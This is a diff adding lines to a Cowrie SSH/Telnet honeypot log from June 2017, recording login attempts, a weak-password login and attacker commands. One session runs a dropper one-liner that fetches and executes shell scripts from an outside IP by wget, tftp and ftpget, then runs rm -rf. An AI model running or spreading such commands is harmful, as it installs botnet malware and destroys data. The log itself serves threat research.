@@ -3134,3 +3134,53 @@
 2017-06-09T08:09:01+0000 [HoneyPotSSHTransport,13875,154.16.3.104] NEW KEYS
 2017-06-09T08:09:01+0000 [HoneyPotSSHTransport,13875,154.16.3.104] starting service 'ssh-userauth'
 2017-06-09T08:09:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13875,154.16.3.104] '1111' trying auth 'password'
+2017-06-09T08:09:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13875,154.16.3.104] login attempt: 143
+2017-06-09T08:09:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13875,154.16.3.104] login return, expect: [1111/1111]
+2017-06-09T08:09:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13875,154.16.3.104] login attempt [1111/1111] succeeded
+2017-06-09T08:09:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13875,154.16.3.104] '1111' authenticated with 'password'
+2017-06-09T08:09:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13875,154.16.3.104] starting service 'ssh-connection'
+2017-06-09T08:09:05+0000 [CowrieTelnetTransport,31861,201.81.9.167] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-09T08:09:05+0000 [CowrieTelnetTransport,31861,201.81.9.167] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-09T08:09:05+0000 [CowrieTelnetTransport,31861,201.81.9.167] Command found: /bin/busybox cat /bin/busybox
+2017-06-09T08:09:05+0000 [CowrieTelnetTransport,31861,201.81.9.167] Command found: cat /bin/busybox
+2017-06-09T08:09:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13874,116.104.124.100] got channel 'direct-tcpip' request
+2017-06-09T08:09:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13874,116.104.124.100] direct-tcp connection request to 91.198.22.70:80 from localhost:21417
+2017-06-09T08:09:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] got channel 'session' request
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] channel open
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Opening TTY Log: log/tty/20170609-080905-c34998f0-0e.log
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Command found: cd /tmp
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Command found: cd /var/run
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Command found: cd /mnt
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Command found: cd /root
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Command found: cd /
+2017-06-09T08:09:05+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Command found: wget http://107.174.34.70/Swag.sh
+2017-06-09T08:09:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-09T08:09:06+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13874,116.104.124.100] direct-tcp forward to 91.198.22.70:80 with data 'GET http://checkip.dyndns.com/ HTTP/1.1\r\nHost: checkip.dyndns.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0\r\nConnection: Keep-Alive\r\n\r\n'
+2017-06-09T08:09:06+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13874,116.104.124.100] failed to connect: Connection refused
+2017-06-09T08:09:06+0000 [SSHChannel None (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13874,116.104.124.100] sending close 0
+2017-06-09T08:09:06+0000 [SSHChannel None (85) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13612,134.19.187.75] remote eof
+2017-06-09T08:09:06+0000 [SSHChannel None (85) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13612,134.19.187.75] remote close
+2017-06-09T08:09:06+0000 [SSHChannel None (85) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13612,134.19.187.75] sending close 85
+2017-06-09T08:09:06+0000 [HoneyPotSSHTransport,13874,116.104.124.100] Got remote error, code 0
+	reason: 
+2017-06-09T08:09:06+0000 [HoneyPotSSHTransport,13874,116.104.124.100] avatar user logging out
+2017-06-09T08:09:06+0000 [HoneyPotSSHTransport,13874,116.104.124.100] connection lost
+2017-06-09T08:09:06+0000 [HoneyPotSSHTransport,13874,116.104.124.100] Connection lost after 15 seconds
+2017-06-09T08:09:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] received eof, sending ctrl-d to command
+2017-06-09T08:09:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] remote close
+2017-06-09T08:09:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] Closing TTY Log: log/tty/20170609-080905-c34998f0-0e.log after 10 seconds
+2017-06-09T08:09:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-09T08:09:15+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13875,154.16.3.104] sending close 0
+2017-06-09T08:09:15+0000 [HoneyPotSSHTransport,13875,154.16.3.104] avatar 1111 logging out
+2017-06-09T08:09:15+0000 [HoneyPotSSHTransport,13875,154.16.3.104] connection lost
+2017-06-09T08:09:15+0000 [HoneyPotSSHTransport,13875,154.16.3.104] Connection lost after 18 seconds
+2017-06-09T08:09:26+0000 [-] Authentication Timeout reached
+2017-06-09T08:09:26+0000 [HoneyPotSSHTransport,13872,113.195.145.52] connection lost
+2017-06-09T08:09:26+0000 [HoneyPotSSHTransport,13872,113.195.145.52] Connection lost after 120 seconds
+2017-06-09T08:09:35+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-09T08:09:35+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-09T08:09:35+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-09T08:09:36+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:15062 (10.8.41.81:2222) [session: de012188]
